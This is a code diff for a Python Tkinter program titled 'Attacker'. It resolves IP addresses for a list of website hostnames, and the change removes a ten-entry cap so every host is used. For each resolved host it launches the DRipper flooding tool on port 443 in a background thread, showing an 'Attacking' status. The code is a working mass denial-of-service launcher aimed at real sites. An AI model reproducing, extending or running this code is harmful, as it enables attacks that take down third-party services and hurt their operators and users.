@@ -1060,7 +1060,7 @@ OptionList = [
 
 ] 
 
-f = [i.replace('https://', '').replace('http://', '').replace('/', '') for i in list(d.keys())[:10]]
+f = [i.replace('https://', '').replace('http://', '').replace('/', '') for i in list(d.keys())]
 OptionList.extend(f)
 OptionList=list(set(OptionList))
 
@@ -1072,6 +1072,7 @@ def get_ip(host):
 		ip = random.choice(ips)
 	except:
 		ip = '255.255.255.255'
+		return ip
 	return ip.to_text()
 
 
@@ -1080,12 +1081,12 @@ app.title("Attacker")
 
 app.geometry('300x300')
 
-host= tk.StringVar(app)
-host.set(OptionList[0])
+# host= tk.StringVar(app)
+# host.set(OptionList[0])
 
-opt = tk.OptionMenu(app, host, *OptionList)
-opt.config(width=90, font=('Helvetica', 12))
-opt.pack()
+# opt = tk.OptionMenu(app, host, *OptionList)
+# opt.config(width=90, font=('Helvetica', 12))
+# opt.pack()
 
 message = tk.StringVar(app)
 label = tk.Label(app, textvariable=message)
@@ -1098,16 +1099,28 @@ text = tk.Text(app, height=5, width=152)
 proc = None
 
 
+def a(ip):
+	cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
+	with subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE) as process:
+		while True:
+			output = process.communicate()[0].decode() # "utf-8")
+			print(output)
+			text.insert('1.0', output)
+
+	# t = threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True)
+	
+
+
 def start():
 	for hostText in OptionList:
 		ip = get_ip(hostText)
-		if ip == '255.255.255.255':
-			continue
-		message.set(f"Attacking {hostText} ({ip})")
-		current = pathlib.Path(__file__).parent.resolve()
-		os.chdir(current)
-		cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
-		threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True).start()
+		if ip != '255.255.255.255':
+			# message.set(f"Attacking {hostText} ({ip})")
+			current = pathlib.Path(__file__).parent.resolve()
+			os.chdir(current)
+			cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
+			# threading.Thread(target=a, args=(ip, ), daemon=True).start()
+			threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True).start()
 
 
 def stop():
